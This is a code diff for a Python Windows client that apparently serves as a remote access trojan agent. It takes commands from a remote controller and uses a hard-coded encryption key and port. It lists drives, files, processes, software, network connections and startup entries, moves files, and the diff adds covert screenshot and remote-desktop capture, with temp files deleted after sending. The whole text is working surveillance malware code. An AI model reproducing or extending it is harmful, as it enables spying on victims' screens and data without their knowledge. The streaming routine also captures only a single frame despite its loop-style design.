@@ -11,6 +11,10 @@ from pathlib import Path
 from datetime import datetime
 import psutil
 import winreg
+from PIL import Image, ImageGrab
+from io import BytesIO
+import mss
+import mss.tools
 
 class EntryPoint:
     @staticmethod
@@ -23,6 +27,8 @@ class MainForm:
     def __init__(self):
         self.client = None
         self.connection_thread = None
+        self.screensending = None
+        self.stop_thread = threading.Event()
         self.encryption_key = "xilAeTlwiiVXyBD0qxHJHpW8d8tbPqTw"
         self.delay = 100
         self.client_port = 4440
@@ -100,23 +106,7 @@ class MainForm:
         print(f"Receiving message: {msg}")
         try:
             if msg.startswith("NewConnection"):
-                pass
-            elif msg.startswith("Disconnected"):
-                self.restart_connection()
-            elif msg.startswith("Restart"):
-                self.restart_application()
-            elif msg.startswith("Close"):
-                exit(0)
-            elif msg.startswith("GetProcess"):
-                self.SendProcess()
-            elif msg.startswith("Software"):
-                self.GetInstalledSoftware()
-            elif msg.startswith("GetTCPConnections"):
-                tcp_connections = self.GetTCPConnections()
-                encrypted_data = self.AESEncrypt("TCPConnections" + tcp_connections, self.encryption_key)
-                self.send(encrypted_data)
-            elif msg.startswith("GetStartup"):
-                self.GetStartupEntries()    
+                pass   
             elif msg.startswith("ListDrives"):
                 self.list_drives()
             elif msg.startswith("ListFiles"):
@@ -145,6 +135,36 @@ class MainForm:
                 self.share_file(msg.replace("sharefile", ""))
             elif msg.startswith("FileUpload"):
                 self.upload_file(msg.replace("FileUpload", ""))
+            elif msg.startswith("Disconnected"):
+                self.restart_connection()
+            elif msg.startswith("Restart"):
+                self.restart_application()
+            elif msg.startswith("Close"):
+                exit(0)
+            elif msg.startswith("GetProcess"):
+                self.SendProcess()
+            elif msg.startswith("Software"):
+                self.GetInstalledSoftware()
+            elif msg.startswith("GetTCPConnections"):
+                tcp_connections = self.GetTCPConnections()
+                encrypted_data = self.AESEncrypt("TCPConnections" + tcp_connections, self.encryption_key)
+                self.send(encrypted_data)
+            elif msg.startswith("GetStartup"):
+                self.GetStartupEntries()
+            elif msg.startswith("GetThumbNails"):
+                self.SendThumbNail()
+            elif msg.startswith("RD"):
+                parts = msg.split('|')
+                comp = int(parts[1])
+                res = parts[2]
+                self.stop_thread.clear()  # Clear the stop flag
+                self.screensending = threading.Thread(target=self.SendScreenInternal, args=(res, comp))
+                self.screensending.start()
+            elif msg.startswith("Stop"):
+                if self.screensending:
+                    self.stop_thread.set()  # Signal the thread to stop
+                    self.screensending.join()  # Wait for the thread to finish
+
         except Exception as e:
             print(f"Exception in Parse: {e}")
 
@@ -402,6 +422,77 @@ class MainForm:
             print(f"Error in GetStartupEntries: {e}")
 
     #end region
+
+    #screen
+    def SendThumbNail(self):
+        try:
+            # Capture the screen
+            with mss.mss() as sct:
+                monitor = sct.monitors[1]
+                screenshot = sct.grab(monitor)
+
+                img = Image.frombytes('RGB', (screenshot.width, screenshot.height), screenshot.rgb)
+
+                # Create thumbnail
+                img_thumbnail = img.copy()
+                img_thumbnail.thumbnail((242, 152))
+
+                # Save the thumbnail as JPEG with high quality
+                temp_file_path = os.path.join(os.getenv('TEMP'), 'thumb.jpg')
+                img_thumbnail.save(temp_file_path, 'JPEG', quality=100)
+
+                # Read the saved file, encrypt it, and send it
+                with open(temp_file_path, 'rb') as file:
+                    base64_thumbnail = base64.b64encode(file.read()).decode('utf-8')
+                self.send(self.AESEncrypt("ThumbNail" + base64_thumbnail, self.encryption_key))
+
+                # Delete the temporary file
+                os.remove(temp_file_path)
+        except Exception as e:
+            print(f"Error in SendThumbNail: {e}")
+
+
+    def SendScreenInternal(self, res, comp):
+        try:
+            resolution = res.split('x')
+            width = int(resolution[0])
+            height = int(resolution[1])
+
+            with mss.mss() as sct:
+                if not self.stop_thread.is_set():
+                    monitor = sct.monitors[1]
+                    screenshot = sct.grab(monitor)
+
+                    img = Image.frombytes('RGB', (screenshot.width, screenshot.height), screenshot.rgb)
+
+                    # Create thumbnail
+                    img_thumbnail = img.copy()
+                    img_thumbnail.thumbnail((width, height))
+
+                    # Save the thumbnail as JPEG with specified quality
+                    temp_file_path = os.path.join(os.getenv('TEMP'), 'scr.jpg')
+                    img_thumbnail.save(temp_file_path, 'JPEG', quality=comp)
+
+                    # Read the saved file, encrypt it, and send it
+                    with open(temp_file_path, 'rb') as file:
+                        base64_screenshot = base64.b64encode(file.read()).decode('utf-8')
+                    self.send(self.AESEncrypt("RemoteDesktop" + base64_screenshot, self.encryption_key))
+
+                    # Delete the temporary file
+                    os.remove(temp_file_path)
+
+                    # Clean up images to free memory
+                    img.close()
+                    img_thumbnail.close()
+                    
+                    # Sleep for 2 seconds to control the capture rate
+                    time.sleep(2)
+        except Exception as e:
+            print(f"Error in SendScreenInternal: {e}")
+        finally:
+            self.stop_thread.set()
+
+    #end screen
 
 
 
